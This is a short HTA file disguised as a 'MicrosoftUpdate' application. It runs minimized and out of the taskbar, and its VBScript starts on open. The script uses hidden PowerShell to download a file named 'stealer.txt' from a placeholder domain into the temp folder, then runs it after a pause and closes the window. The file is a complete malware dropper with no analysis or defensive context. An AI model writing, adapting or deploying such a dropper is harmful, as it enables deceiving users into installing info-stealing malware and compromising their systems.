<html>
<head>
<HTA:APPLICATION ID="MicrosoftUpdate" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
    Sub Run
        Set ws = CreateObject("WScript.Shell")
        ' Stage 1: Download payload
        ws.Run "powershell -nop -w 1 -c ""$temp='%TEMP%\payload.ps1';(New-Object Net.WebClient).DownloadFile('https://yourdomain.com/stealer.txt',$temp)""", 0, True
        ' Stage 2: Execute with delay
        ws.Run "powershell -nop -w 1 -c ""Start-Sleep 5; & '%TEMP%\payload.ps1'""", 0, False
        window.close()
    End Sub
    Run
</script>
</head>
<body></body>
</html>
